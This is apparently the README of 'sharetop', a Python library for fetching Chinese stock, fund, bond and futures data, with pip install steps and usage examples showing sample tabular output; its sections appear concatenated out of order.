>>> sp.stock.get_real_time_bill('300033')
      股票名称    股票代码                时间        主力净流入        小单净流入        中单净流入       大单净流入       超大单净流入
0    同花顺  300033  2023-04-26 09:31   -3217110.0     282877.0    2934232.0  -2000281.0   -1216829.0
1    同花顺  300033  2023-04-26 09:32   -2170472.0    1124259.0    1046212.0    155117.0   -2325589.0
2    同花顺  300033  2023-04-26 09:33   -9655528.0    6350780.0    3304748.0  -1823981.0   -7831547.0
3    同花顺  300033  2023-04-26 09:34  -16808716.0    9597965.0    7210752.0  -5368535.0  -11440181.0
4    同花顺  300033  2023-04-26 09:35  -20358486.0   12331063.0    8027424.0  -5877906.0  -14480580.0
..   ...     ...               ...          ...          ...          ...         ...          ...
235  同花顺  300033  2023-04-26 14:56 -282170831.0  124642581.0  157528257.0  77398429.0 -359569260.0
236  同花顺  300033  2023-04-26 14:57 -284631720.0  127536411.0  157095316.0  78138042.0 -362769762.0
237  同花顺  300033  2023-04-26 14:58 -284631720.0  127536411.0  157095316.0  78138042.0 -362769762.0
238  同花顺  300033  2023-04-26 14:59 -284631720.0  127536411.0  157095316.0  78138042.0 -362769762.0
239  同花顺  300033  2023-04-26 15:00 -284631720.0  127536411.0  157095316.0  78138042.0 -362769762.0

[240 rows x 8 columns]
```

### Fund

- 获取基金历史净值信息

```python
>>> import sharetop as sp
>>> sp.fund.get_fund_history('010434')
     日期    单位净值    累计净值   涨跌幅
0    2023-04-26  1.2760  1.2760 -1.15
1    2023-04-25  1.2909  1.2909  -1.5
2    2023-04-24  1.3105  1.3105  0.75
3    2023-04-21  1.3007  1.3007  0.26
4    2023-04-20  1.2973  1.2973  0.02
..          ...     ...     ...   ...
608  2020-10-28  0.9987  0.9987 -0.02
609  2020-10-27  0.9989  0.9989 -0.01
610  2020-10-26  0.9990  0.9990 -0.05
611  2020-10-23  0.9995  0.9995    --
612  2020-10-20  1.0000  1.0000    --

[613 rows x 4 columns]
```

- 获取基金公开持仓信息

```python
>>> import sharetop as sp
>>> # 获取最新公开的持仓数据
>>> sp.fund.get_invest_position('010434')
    基金代码    股票代码  股票简称  持仓占比  较上期变化        公开日期
0  010434  600329   达仁堂  9.52   0.90  2023-03-31
1  010434  600557  康缘药业  9.34  -0.54  2023-03-31
2  010434  600572   康恩贝  6.22  -0.42  2023-03-31
3  010434  300181  佐力药业  5.25  -1.10  2023-03-31
4  010434  600129  太极集团  5.19   0.39  2023-03-31
5  010434  603998  方盛制药  5.09   5.09  2023-03-31
6  010434  002603  以岭药业  5.04   5.04  2023-03-31
7  010434  600535   天士力  4.82   4.82  2023-03-31
8  010434  000989   九芝堂  4.53   4.53  2023-03-31
9  010434  300396  迪瑞医疗  4.42   4.42  2023-03-31
```

- 获取单只基金实时净值估算

```python
>>> import sharetop as sp
>>> sp.fund.get_fund_real_time_god('010434')
基金名称    基金代码    净值估算     涨跌值  估算涨幅              估值时间
0  红土创新医疗保健股票  010434  1.2959  0.0199  1.56  2023-04-27 10:12
```

- 获取单多支基金实时净值估算

```python
>>> import sharetop as sp
>>> sp.fund.get_fund_real_time_god(['010434', '004997'])
基金名称    基金代码    净值估算      涨跌值   估算涨幅              估值时间
0   广发高端制造股票A  004997  2.2639  -0.0126  -0.55  2023-04-27 10:31
1  红土创新医疗保健股票  010434  1.3059   0.0299   2.34  2023-04-27 10:31
```

### Bond

- 可转债整体行情

```python
>>> import sharetop as sp
>>> sp.bond.get_bond_realtime_quotes()
债券代码  债券名称    涨跌幅      最新价       最高       最低       今开  ...     昨日收盘         总市值        流通市值      行情ID 市场类型                 更新时间       最新交易日
0    127082  亚科转债   20.0    120.0    120.0  116.992    118.0  ...  100.000  1390800000  1390800000  0.127082   深A  2023-04-27 10:39:36  2023-04-27
1    113668  N鹿山转  16.51  116.511    118.0  115.485    116.9  ...  100.000           -   610517640  1.113668   沪A  2023-04-27 10:39:42  2023-04-27
2    128100  搜特转债   9.44    69.55   71.257    59.32   62.825  ...   63.550   555023119   555037029  0.128100   深A  2023-04-27 10:39:45  2023-04-27
3    123118  惠城转债   7.48  224.839  234.107    209.5    212.0  ...  209.200   444834968   445107023  0.123118   深A  2023-04-27 10:39:45  2023-04-27
4    123181  亚康转债   5.79  158.067   163.28    155.0    155.0  ...  149.420   412554870   412554870  0.123181   深A  2023-04-27 10:39:45  2023-04-27
..      ...   ...    ...      ...      ...      ...      ...  ...      ...         ...         ...       ...  ...                  ...         ...
501  123185  能辉转债  -2.84  117.753    121.5  116.965    119.9  ...  121.199   409670930   409670930  0.123185   深A  2023-04-27 10:39:45  2023-04-27
502  123116  万兴转债  -4.14   250.08    257.0  245.256    256.0  ...  260.888   511184277   511211785  0.123116   深A  2023-04-27 10:39:45  2023-04-27
503  123152  润禾转债  -4.83  130.057    134.9  129.111    134.7  ...  136.657   380107580   380107580  0.123152   深A  2023-04-27 10:39:45  2023-04-27
504  110058  永鼎转债  -7.04  155.155  164.999  154.181    162.0  ...  166.914           -   404116092  1.110058   沪A  2023-04-27 10:39:44  2023-04-27
505  123046  天铁转债 -16.72  389.318  481.525    387.0  471.441  ...  467.500   227693022   227693022  0.123046   深A  2023-04-27 10:39:45  2023-04-27

[506 rows x 20 columns]
```

- 全部可转债信息

```python
>>> import sharetop as sp
>>> sp.bond.get_bond_base_info_list()
      债券代码   债券名称    正股代码  正股名称  ...                 上市日期                 到期日期   期限(年)
               利率说明
0    118034   晶能转债  688223  晶科能源  ...                 None  2029-04-20 00:00:00       6  本次发行的可转债票面利率为第一年0.20%、第二年0.40%、第三年0.60%、第四年1.5...
1    123196  正元转02  300645  正元智慧  ...                 None  2029-04-18 00:00:00       6  第一年0.20%、第二年0.40%、第三年0.60%、第四年1.50%、第五年1.80%、第...
2    113670  金23转债  603180  金牌厨柜  ...                 None  2029-04-17 00:00:00       6  本次发行的可转债票面利率设定为:第一年0.30%、第二年0.50%、第三年1.00%、第四年...
3    123195  蓝晓转02  300487  蓝晓科技  ...                 None  2029-04-17 00:00:00       6   第一年0.4%,第二年0.6%,第三年1.1%,第四年1.8%,第五 年2.5%,第六年3.0%。
4    123194   百洋转债  301015  百洋医药  ...                 None  2029-04-14 00:00:00       6  第一年0.30%、第二年0.50%、第三年1.00%、第四年1.50%、第五年2.00%、第...
..      ...    ...     ...   ...  ...                  ...                  ...     ...                                                ...
815  110227   赤化转债  600227   圣济堂  ...  2007-10-23 00:00:00  2009-05-25 00:00:00  1.6192  票面利率和付息日期:本次发行的可转债票面利率第一年 为1.5%、第二年为1.8%、第三年为2....
816  126006  07深高债  600548   深高速  ...  2007-10-30 00:00:00  2013-10-09 00:00:00       6                                               None
817  110971   恒源转债  600971  恒源煤电  ...  2007-10-12 00:00:00  2009-12-21 00:00:00  2.2484  票面利率为:第一年年利率1.5%,第二年年利率1.8%,第三年年利率2.1%,第四年年利率2...
818  110567   山鹰转债  600567  山鹰国际  ...  2007-09-17 00:00:00  2010-02-01 00:00:00  2.4055  票面利率和付息日期:本次发行的可转债票面利率第一年为1.4%,第二年为1.7%,第三年为2....
819  110026   中海转债  600026  中远海能  ...  2007-07-12 00:00:00  2008-03-27 00:00:00   0.737  票面利率:第一年为1.84%,第二年为2.05%,第三年为2.26%,第四年为2.47%,第...

[820 rows x 12 columns]
```

- 指定可转债 K 线数据

```python
>>> import sharetop as sp
>>> # 可转债代码（以 东财转3 为例）
>>> bond_code = '123111'
>>> sp.stock.get_history_data(bond_code)
    债券名称    债券代码          日期       开盘       收盘       最高       最低      成交量           成交额    振幅    涨跌幅     涨跌额    换手率
0   东财转3  123111  2021-04-23  130.000  130.000  130.000  130.000  1836427  2.387355e+09  0.00  30.00  30.000  11.62
1   东财转3  123111  2021-04-26  130.353  130.010  133.880  125.110  8610944  1.126033e+10  6.75   0.01   0.010  54.50
2   东财转3  123111  2021-04-27  129.000  129.600  130.846  128.400  1820766  2.357472e+09  1.88  -0.32  -0.410  11.52
3   东财转3  123111  2021-04-28  129.100  130.770  131.663  128.903  1467727  1.921641e+09  2.13   0.90   1.170   9.29
4   东财转3  123111  2021-04-29  130.690  131.208  133.150  130.560  1156934  1.525974e+09  1.98   0.33   0.438   7.32
..   ...     ...         ...      ...      ...      ...      ...      ...           ...   ...    ...     ...    ...
72  东财转3  123111  2021-08-09  159.600  159.300  162.990  158.690   596124  9.585751e+08  2.69  -0.34  -0.550   3.77
73  东财转3  123111  2021-08-10  159.190  160.950  161.450  157.000   517237  8.234596e+08  2.79   1.04   1.650   3.27
74  东财转3  123111  2021-08-11  161.110  159.850  162.300  159.400   298906  4.800711e+08  1.80  -0.68  -1.100   1.89
75  东财转3  123111  2021-08-12  159.110  158.290  160.368  158.010   270641  4.298100e+08  1.48  -0.98  -1.560   1.71
76  东财转3  123111  2021-08-13  158.000  158.358  160.290  157.850   250059  3.975513e+08  1.54   0.04   0.068   1.58

[77 rows x 13 columns]
```

- 国债发行

```python
>>> import sharetop as sp
>>> start_date = '20230407' # 开始日期
>>> end_date = '20230425' # 结束日期
>>> sp.bond.bond_treasure_issue_cninfo(start_date, end_date)
    债券代码      债券简称  ...        公告日期                债券名称
0   019697    23国债04  ...  2023-04-26    2023年记账式附息(四期)国债
1   102232    国债2304  ...  2023-04-26    2023年记账式附息(四期)国债
2   230004  23附息国债04  ...  2023-04-26    2023年记账式附息(四期)国债
3   019703    23国债10  ...  2023-04-17    2023年记账式附息(十期)国债
4   102238    国债2310  ...  2023-04-17    2023年记账式附息(十期)国债
5   230010  23附息国债10  ...  2023-04-17    2023年记账式附息(十期)国债
6   020561    23贴债23  ...  2023-04-14  2023年记账式贴现(二十三期)国债
7   108561    贴债2323  ...  2023-04-14  2023年记账式贴现(二十三期)国债
8   239923  23贴现国债23  ...  2023-04-14  2023年记账式贴现(二十三期)国债
9   020562    23贴债24  ...  2023-04-20  2023年记账式贴现(二十四期)国债
10  108562    贴债2324  ...  2023-04-20  2023年记账式贴现(二十四期)国债
11  239924  23贴现国债24  ...  2023-04-20  2023年记账式贴现(二十四期)国债
12  019696    23国债03  ...  2023-04-24    2023年记账式附息(三期)国债
13  102231    国债2303  ...  2023-04-24    2023年记账式附息(三期)国债
14  230003  23附息国债03  ...  2023-04-24    2023年记账式附息(三期)国债
15  019699    23国债06  ...  2023-04-24    2023年记账式附息(六期)国债
16  102234    国债2306  ...  2023-04-24    2023年记账式附息(六期)国债
17  230006  23附息国债06  ...  2023-04-24    2023年记账式附息(六期)国债

[18 rows x 15 columns]

```


### Futures

- 获取交易所期货基本信息

```python
>>> import sharetop as sp
>>> sp.futures.get_futures_base_info()
       期货代码     期货名称        行情ID 市场类型
0    wr2310   线材2310  113.wr2310  上期所
1     SM307    锰硅307   115.SM307  郑商所
2    fb2307  纤维板2307  114.fb2307  大商所
3       SMM     锰硅主力     115.SMM  郑商所
4     SM306    锰硅306   115.SM306  郑商所
..      ...      ...         ...  ...
881  jm2310   焦煤2310  114.jm2310  大商所
882  jm2308   焦煤2308  114.jm2308  大商所
883  jm2307   焦煤2307  114.jm2307  大商所
884     jms    焦煤次主力     114.jms  大商所
885  jm2305   焦煤2305  114.jm2305  大商所

[886 rows x 4 columns]
```

- 获取期货历史行情

```python
>>> import sharetop as sp
>>> # 获取全部期货行情ID列表
>>> quote_ids = sp.futures.get_realtime_quotes()['行情ID']
>>> # 指定单个期货的行情ID(以上面获得到的行情ID列表为例)
>>> quote_id = quote_ids[0]
>>> # 查看第一个行情ID
>>> quote_ids[0]
'113.wr2310'
>>> # 获取第行情ID为第一个的期货日 K 线数据
>>> sp.futures.get_history_data(quote_id)
       期货名称    期货代码          日期    开盘    收盘    最高    最低  成交量     成交额    振幅   涨跌幅    涨跌额  换手率
0  线材2310  wr2310  2022-11-14  4065  4350  4350  4065    4  168300  0.00  0.00    0.0  0.0
1  线材2310  wr2310  2022-11-28  4401  4151  4401  4151    2   85520  5.94 -1.33  -56.0  0.0
2  线材2310  wr2310  2023-04-07  4582  4582  4582  4582    5  229100  0.00  7.16  306.0  0.0
3  线材2310  wr2310  2023-04-13  4582  4582  4582  4582    1   45820  0.00  0.00    0.0  0.0
4  线材2310  wr2310  2023-04-24  4445  4260  4445  4260    2   87050  4.04 -7.03 -322.0  0.0
5  线材2310  wr2310  2023-04-25  4468  4390  4468  4213   10  434890  5.86  0.87   38.0  0.0
6  线材2310  wr2310  2023-04-26  4253  4253  4253  4253    1   42530  0.00 -2.18  -95.0  0.0
7  线材2310  wr2310  2023-04-27  4587  4587  4587  4587    1   45870  0.00  7.85  334.0  0.0

>>> # 指定多个期货的 行情ID
>>> quote_ids = ['115.ZCM','115.ZC109']
>>> futures_df = sp.futures.get_history_data(quote_ids)
>>> type(futures_df)
<class 'dict'>
>>> futures_df['115.ZCM']
       期货名称 期货代码          日期     开盘     收盘     最高     最低    成交量           成交额    振幅   涨跌幅   涨跌额  换手率
0     动力煤主力  ZCM  2015-05-18  440.0  437.6  440.2  437.6     64  2.806300e+06  0.00  0.00   0.0  0.0
1     动力煤主力  ZCM  2015-05-19  436.0  437.0  437.6  436.0      6  2.621000e+05  0.36 -0.32  -1.4  0.0
2     动力煤主力  ZCM  2015-05-20  436.8  435.8  437.0  434.8      8  3.487500e+05  0.50 -0.23  -1.0  0.0
3     动力煤主力  ZCM  2015-05-21  438.0  443.2  446.8  437.8     37  1.631850e+06  2.06  1.65   7.2  0.0
4     动力煤主力  ZCM  2015-05-22  439.2  441.4  443.8  439.2     34  1.502500e+06  1.04  0.09   0.4  0.0
...     ...  ...         ...    ...    ...    ...    ...    ...           ...   ...   ...   ...  ...
1524  动力煤主力  ZCM  2021-08-17  755.0  770.8  776.0  750.6  82373  6.288355e+09  3.25 -1.26  -9.8  0.0
1525  动力煤主力  ZCM  2021-08-18  770.8  776.8  785.8  766.0  77392  6.016454e+09  2.59  1.76  13.4  0.0
1526  动力煤主力  ZCM  2021-08-19  776.8  777.6  798.0  764.6  97229  7.597474e+09  4.30  0.03   0.2  0.0
1527  动力煤主力  ZCM  2021-08-20  778.0  793.0  795.0  775.2  70549  5.553617e+09  2.53  1.48  11.6  0.0
1528  动力煤主力  ZCM  2021-08-23  796.8  836.6  843.8  796.8  82954  6.850341e+09  5.97  6.28  49.4  0.0

[1529 rows x 13 columns]
```


## Contact

[![Github](https://img.shields.io/badge/Github-blue?style=social&logo=github)](https://github.com/nrliangxy)
[![Email](https://img.shields.io/badge/Email-blue)](mailto:nrliangxy@foxmail.com)
","## Introduction

[![Python Version](https://img.shields.io/badge/python-3.6+-blue.svg?style=flat)](https://pypi.python.org/pypi/sharetop)
[![Pypi Package](https://img.shields.io/pypi/v/sharetop.svg?maxAge=60)](https://pypi.python.org/pypi/sharetop)
[![Pypi-Install](https://img.shields.io/pypi/dm/sharetop.svg?maxAge=2592000&label=installs&color=%2327B1FF)](https://pypi.python.org/pypi/sharetop)
[![Github Stars](https://img.shields.io/github/stars/sharetop/sharetop.svg?style=social&label=Star&maxAge=60)](https://github.com/nrliangxy/sharetop)

[`sharetop`](https://github.com/nrliangxy/sharetop) 是由个人打造的用于获取股票、基金、期货数据的免费开源 Python 库，你可以使用它很方便地获取数据以便更好地服务于个人的交易系统需求。

- [`Source Code`](https://github.com/nrliangxy/sharetop)

---

## Installation

- 通过 `pip` 安装

```bash
pip install sharetop
```

- 通过 `pip` 更新

```bash
pip install sharetop --upgrade
```

---

## Examples

### Stock

- 获取股票历史日 K 线数据

```python
>>> import sharetop as sp
>>> # 股票代码
>>> stock_code = '600519'
>>> sp.stock.get_history_data(stock_code)
      股票名称    股票代码          日期       开盘       收盘       最高       最低       成交量           成交额    振幅   涨跌幅    涨跌额    换手率
0     贵州茅台  600519  2001-08-27   -89.74   -89.53   -89.08   -90.07  406318.0  1.410347e+09 -1.10  0.92   0.83  56.83
1     贵州茅台  600519  2001-08-28   -89.64   -89.27   -89.24   -89.72  129647.0  4.634630e+08 -0.54  0.29   0.26  18.13
2     贵州茅台  600519  2001-08-29   -89.24   -89.36   -89.24   -89.42   53252.0  1.946890e+08 -0.20 -0.10  -0.09   7.45
3     贵州茅台  600519  2001-08-30   -89.38   -89.22   -89.14   -89.44   48013.0  1.775580e+08 -0.34  0.16   0.14   6.72
4     贵州茅台  600519  2001-08-31   -89.21   -89.24   -89.12   -89.28   23231.0  8.623100e+07 -0.18 -0.02  -0.02   3.25
...    ...     ...         ...      ...      ...      ...      ...       ...           ...   ...   ...    ...    ...
4756  贵州茅台  600519  2021-07-23  1937.82  1900.00  1937.82  1895.09   47585.0  9.057762e+09  2.20 -2.06 -40.01   0.38
4757  贵州茅台  600519  2021-07-26  1879.00  1804.11  1879.00  1780.00   98619.0  1.789436e+10  5.21 -5.05 -95.89   0.79
4758  贵州茅台  600519  2021-07-27  1803.00  1712.89  1810.00  1703.00   86577.0  1.523081e+10  5.93 -5.06 -91.22   0.69
4759  贵州茅台  600519  2021-07-28  1703.00  1768.90  1788.20  1682.12   85369.0  1.479247e+10  6.19  3.27  56.01   0.68
4760  贵州茅台  600519  2021-07-29  1810.01  1740.00  1823.00  1734.34   51035.0  9.067345e+09  5.01 -1.63 -28.90   0.41

[4761 rows x 13 columns]
```

- 获取非 A 股的股票 K 线数据（支持输入股票名称以及代码）

```python
>>> import sharetop as sp
>>> # 股票代码
>>> stock_code = 'AAPL'
>>> sp.stock.get_history_data(stock_code)
     股票名称  股票代码          日期      开盘      收盘      最高      最低          成交量           成交额    振幅   涨跌幅   涨跌额   换手率
0      苹果  AAPL  1984-09-07   -5.37   -5.37   -5.36   -5.37    2981600.0  0.000000e+00  0.00  0.00  0.00  0.02
1      苹果  AAPL  1984-09-10   -5.37   -5.37   -5.36   -5.37    2346400.0  0.000000e+00 -0.19  0.00  0.00  0.01
2      苹果  AAPL  1984-09-11   -5.36   -5.36   -5.36   -5.36    5444000.0  0.000000e+00  0.00  0.19  0.01  0.03
3      苹果  AAPL  1984-09-12   -5.36   -5.37   -5.36   -5.37    4773600.0  0.000000e+00 -0.19 -0.19 -0.01  0.03
4      苹果  AAPL  1984-09-13   -5.36   -5.36   -5.36   -5.36    7429600.0  0.000000e+00  0.00  0.19  0.01  0.04
...   ...   ...         ...     ...     ...     ...     ...          ...           ...   ...   ...   ...   ...
8739   苹果  AAPL  2021-07-22  145.94  146.80  148.19  145.81   77338156.0  1.137623e+10  1.64  0.96  1.40  0.47
8740   苹果  AAPL  2021-07-23  147.55  148.56  148.72  146.92   71447416.0  1.058233e+10  1.23  1.20  1.76  0.43
8741   苹果  AAPL  2021-07-26  148.27  148.99  149.83  147.70   72434089.0  1.080774e+10  1.43  0.29  0.43  0.44
8742   苹果  AAPL  2021-07-27  149.12  146.77  149.21  145.55  104818578.0  1.540140e+10  2.46 -1.49 -2.22  0.63
8743   苹果  AAPL  2021-07-28  144.81  144.98  146.97  142.54  118931191.0  1.723188e+10  3.02 -1.22 -1.79  0.72

[8744 rows x 13 columns]

>>> # 股票名称
>>> stock_name = '微软'
>>> sp.stock.get_history_data(stock_name)
       股票名称  股票代码          日期      开盘      收盘      最高      最低           成交量           成交额    振幅   涨跌幅   涨跌额    换手率
0      微软  MSFT  1986-03-13  -20.74  -20.73  -20.73  -20.74  1.031789e+09  0.000000e+00  0.00  0.00  0.00  13.72
1      微软  MSFT  1986-03-14  -20.73  -20.73  -20.73  -20.73  3.081600e+08  0.000000e+00  0.00  0.00  0.00   4.10
2      微软  MSFT  1986-03-17  -20.73  -20.73  -20.73  -20.73  1.331712e+08  0.000000e+00  0.00  0.00  0.00   1.77
3      微软  MSFT  1986-03-18  -20.73  -20.73  -20.73  -20.73  6.776640e+07  0.000000e+00  0.00  0.00  0.00   0.90
4      微软  MSFT  1986-03-19  -20.73  -20.73  -20.73  -20.73  4.789440e+07  0.000000e+00  0.00  0.00  0.00   0.64
...   ...   ...         ...     ...     ...     ...     ...           ...           ...   ...   ...   ...    ...
8357   微软  MSFT  2021-07-22  283.84  286.14  286.42  283.42  2.338406e+07  6.677062e+09  1.07  1.68  4.74   0.31
8358   微软  MSFT  2021-07-23  287.37  289.67  289.99  286.50  2.276807e+07  6.578686e+09  1.22  1.23  3.53   0.30
8359   微软  MSFT  2021-07-26  289.00  289.05  289.69  286.64  2.317607e+07  6.685868e+09  1.05 -0.21 -0.62   0.31
8360   微软  MSFT  2021-07-27  289.43  286.54  289.58  282.95  3.360407e+07  9.599993e+09  2.29 -0.87 -2.51   0.45
8361   微软  MSFT  2021-07-28  288.99  286.22  290.15  283.83  3.356685e+07  9.638499e+09  2.21 -0.11 -0.32   0.45

[8362 rows x 13 columns]
```

- 获取 ETF K 线数据

```python
>>> import sharetop as sp
>>> # ETF 代码（以中概互联网 ETF 为例）
>>> etf_code = '513050'
>>> sp.stock.get_history_data(etf_code)
      股票名称    股票代码          日期     开盘     收盘     最高     最低         成交量           成交额    振幅   涨跌幅    涨跌额    换手率
0     中概互联网ETF  513050  2017-01-18  0.989  0.977  0.989  0.969    345605.0  3.381795e+07  0.00  0.00  0.000   0.26
1     中概互联网ETF  513050  2017-01-19  0.978  0.989  0.990  0.978    257716.0  2.542553e+07  1.23  1.23  0.012   0.19
2     中概互联网ETF  513050  2017-01-20  0.989  0.988  0.990  0.986     50980.0  5.043289e+06  0.40 -0.10 -0.001   0.04
3     中概互联网ETF  513050  2017-01-23  0.988  0.988  0.989  0.986     13739.0  1.356129e+06  0.30  0.00  0.000   0.01
4     中概互联网ETF  513050  2017-01-24  0.989  0.989  0.992  0.987     17937.0  1.774398e+06  0.51  0.10  0.001   0.01
...        ...     ...         ...    ...    ...    ...    ...         ...           ...   ...   ...    ...    ...
1097  中概互联网ETF  513050  2021-07-23  1.789  1.760  1.789  1.758   4427623.0  7.836530e+08  1.73 -1.51 -0.027   3.32
1098  中概互联网ETF  513050  2021-07-26  1.679  1.645  1.698  1.642  13035366.0  2.182816e+09  3.18 -6.53 -0.115   9.78
1099  中概互联网ETF  513050  2021-07-27  1.600  1.547  1.620  1.546  14269546.0  2.257610e+09  4.50 -5.96 -0.098  10.70
1100  中概互联网ETF  513050  2021-07-28  1.545  1.552  1.578  1.506  13141023.0  2.024106e+09  4.65  0.32  0.005   9.85
1101  中概互联网ETF  513050  2021-07-29  1.615  1.641  1.651  1.606  10658041.0  1.734404e+09  2.90  5.73  0.089   7.99

[1102 rows x 13 columns]
```

- 获取单只股票 5 分钟 K 线数据

```python
>>> import sharetop as sp
>>> # 股票代码
>>> stock_code = '600519'
>>> # 5 分钟
>>> frequency = 5
>>> sp.stock.get_history_data(stock_code, klt=frequency)
      股票名称    股票代码                日期       开盘       收盘       最高       最低     成交量          成交额    振幅   涨跌幅    涨跌额   换手率
0     贵州茅台  600519  2021-06-16 09:35  2172.71  2159.71  2175.71  2150.74  1885.0  411159309.0  1.15 -0.64 -14.00  0.02
1     贵州茅台  600519  2021-06-16 09:40  2156.69  2148.71  2160.48  2143.37  1238.0  268790684.0  0.79 -0.51 -11.00  0.01
2     贵州茅台  600519  2021-06-16 09:45  2149.79  2159.71  2160.69  2149.79   706.0  153631002.0  0.51  0.51  11.00  0.01
3     贵州茅台  600519  2021-06-16 09:50  2159.61  2148.87  2159.71  2148.87   586.0  127346502.0  0.50 -0.50 -10.84  0.00
4     贵州茅台  600519  2021-06-16 09:55  2148.87  2161.04  2163.71  2148.72   788.0  171491075.0  0.70  0.57  12.17  0.01
...    ...     ...               ...      ...      ...      ...      ...     ...          ...   ...   ...    ...   ...
1521  贵州茅台  600519  2021-07-29 13:50  1746.51  1746.09  1748.95  1746.01   738.0  128889575.0  0.17 -0.09  -1.49  0.01
1522  贵州茅台  600519  2021-07-29 13:55  1746.08  1742.01  1746.09  1741.96   831.0  144968679.0  0.24 -0.23  -4.08  0.01
1523  贵州茅台  600519  2021-07-29 14:00  1742.00  1739.58  1742.00  1739.58   864.0  150446840.0  0.14 -0.14  -2.43  0.01
1524  贵州茅台  600519  2021-07-29 14:05  1741.87  1740.00  1745.00  1738.88  1083.0  188427970.0  0.35  0.02   0.42  0.01
1525  贵州茅台  600519  2021-07-29 14:10  1740.00  1740.02  1740.10  1740.00    59.0   10315488.0  0.01  0.00   0.02  0.00

[1526 rows x 13 columns]
```

- 沪深市场 A 股最新状况

```python
>>> import sharetop as sp
>>> sp.stock.get_market_real_time()
        股票代码   股票名称     涨跌幅     最新价      最高      最低      今开     涨跌额    换手率    量比    动态市盈率     成交量           成交额   昨日收盘           总市值         流通市值      行情ID 市场类型
0     688787    N海天  277.59  139.48  172.39  139.25  171.66  102.54  85.62     -    78.93   74519  1110318832.0  36.94    5969744000   1213908667  1.688787   沪A
1     301045    N天禄  149.34   39.42   48.95    39.2   48.95   23.61  66.66     -    37.81  163061   683878656.0  15.81    4066344240    964237089  0.301045   深A
2     300532   今天国际   20.04   12.16   12.16   10.69   10.69    2.03   8.85  3.02   -22.72  144795   171535181.0  10.13    3322510580   1989333440  0.300532   深A
3     300600   国瑞科技   20.02   13.19   13.19   11.11   11.41     2.2  18.61  2.82   218.75  423779   541164432.0  10.99    3915421427   3003665117  0.300600   深A
4     300985   致远新能   20.01   47.08   47.08    36.8    39.4    7.85  66.65  2.17    58.37  210697   897370992.0  39.23    6277336472   1488300116  0.300985   深A
...      ...    ...     ...     ...     ...     ...     ...     ...    ...   ...      ...     ...           ...    ...           ...          ...       ...  ...
4598  603186   华正新材   -10.0   43.27   44.09   43.27   43.99   -4.81   1.98  0.48    25.24   27697   120486294.0  48.08    6146300650   6063519472  1.603186   沪A
4599  688185  康希诺-U  -10.11   476.4  534.94  460.13   530.0   -53.6   6.02  2.74 -2088.07   40239  1960540832.0  530.0  117885131884  31831479215  1.688185   沪A
4600  688148   芳源股份  -10.57    31.3   34.39    31.3    33.9    -3.7  26.07  0.56   220.01  188415   620632512.0   35.0   15923562000   2261706043  1.688148   沪A
4601  300034   钢研高纳  -10.96   43.12   46.81   42.88    46.5   -5.31   7.45  1.77    59.49  323226  1441101824.0  48.43   20959281094  18706911861  0.300034   深A
4602  300712   永福股份  -13.71    96.9  110.94    95.4   109.0   -15.4   6.96  1.26   511.21  126705  1265152928.0  112.3   17645877600  17645877600  0.300712   深A

[4603 rows x 18 columns]
```

- 获取单只股或者多只最新状况

```python
>>> import sharetop as sp
>>> stock_code = '30033'
>>> sp.stock.get_real_time_data(stock_code)
        股票名称    股票代码     最新价    最高价    最低价  ...  市盈率(TTM)    市净率     涨跌值  涨跌幅(%)  振幅(%)
0  同花顺  300033  174.92  198.0  172.3  ...     55.27  15.63 -0.2009   -10.3  13.18
>>> stock_code = ['300033', '516110']
>>> sp.stock.get_real_time_data(stock_code)
{'300033':   股票名称    股票代码     最新价    最高价    最低价  ...  市盈率(TTM)    市净率     涨跌值  涨跌幅(%)  振幅(%)
0  同花顺  300033  174.92  198.0  172.3  ...     55.27  15.63 -0.2009   -10.3  13.18

[1 rows x 23 columns], '516110':     股票名称    股票代码    最新价    最高价  ...   内盘(手)       涨跌值  涨跌幅(%)  振幅(%)
0  汽车ETF  516110  0.945  0.953  ...  466383  0.000023   0.249  0.358

[1 rows x 19 columns]}
```

- 股票龙虎榜

```python
>>> import sharetop as sp
>>> # 获取最新一个公开的龙虎榜数据(后面还有获取指定日期区间的示例代码)
>>> sp.stock.get_daily_billboard()
    股票代码   股票名称        上榜日期                解读  ...   净买额占总成交比    成交额占总成交比          流通市值
                上榜原因
0    000021    深科技  2023-04-26  4家机构卖出，成功率60.41%  ...   2.373821   31.288324  2.661389e+10                          日跌幅偏离值达到7%的前5只证券
1    000150  *ST宜康  2023-04-26    主力做T，成功率29.56%  ... -21.126097   78.093035  4.352347e+08  连续三个交易日内，跌幅偏离值累计达到12%的ST证券、*ST证券和未完成股改证券
2    000606  *ST顺利  2023-04-26  北京资金卖出，成功率42.63%  ... -44.344337  138.384208  7.811153e+08  连续三个交易日内，跌幅偏离值累计达到12%的ST证券、*ST证券和未完成股改证券
3    000620    新华联  2023-04-26  1家机构卖出，成功率35.81%  ... -24.580743   42.757218  2.863903e+09                  连续三个交易日内，跌幅偏离值累计达到20%的证券
4    000719   中原传媒  2023-04-26  2家机构买入，成功率45.96%  ...   5.265043   29.831509  9.119907e+09                           日振幅值达到15% 的前5只证券
..      ...    ...         ...               ...  ...        ...         ...           ...                                       ...
106  688580   伟思医疗  2023-04-26  1家机构买入，成功率46.20%  ...   0.680386   45.458772  1.916985e+09               有价格涨跌幅限制的日收盘价格涨幅达到15%的前五只证券
107  832662   方盛股份  2023-04-26  普通席位买入，成功率33.33%  ...   7.829732   39.737402  1.787436e+08                          当日换手率达到20%的前5只股票
108  833394    民士达  2023-04-26  1家机构买入，成功率35.62%  ...  -0.423705   28.803391  4.664451e+08                          当日换手率达到20% 的前5只股票
109  872808   曙光数创  2023-04-26  1家机构买入，成功率28.49%  ... -10.998660   32.268764  3.259663e+09                        当日收盘价涨幅达到20%的前5只股票
110  900915   中路B股  2023-04-26  普通席位买入，成功率47.33%  ...  -4.542227   51.427620  5.588460e+09             有价格涨跌幅限制的日收盘价格涨幅偏离值达到7%的前五只证券

[111 rows x 16 columns]

>>> # 获取指定日期区间的龙虎榜数据
>>> start_date = '2023-04-07' # 开始日期
>>> end_date = '2023-04-25' # 结束日期
>>> sp.stock.get_daily_billboard(start_date = start_date,end_date = end_date)
           股票代码  股票名称        上榜日期                   解读    收盘价  ...        市场总成交额   净买额占总成交比   成交额占总成交比
 流通市值                         上榜原因
0    000521  长虹美菱  2023-04-25     3家机构买入，成功率36.54%   7.79  ...  7.065423e+08   2.079029  29.969549  7.207487e+09             日涨幅偏离值达到7%的前5只证券
1    000950  重药控股  2023-04-25     2家机构买入，成功率44.64%   7.03  ...  1.158314e+09   5.843986  29.801649  1.214914e+10             日涨幅偏离值达到7%的前5只证券
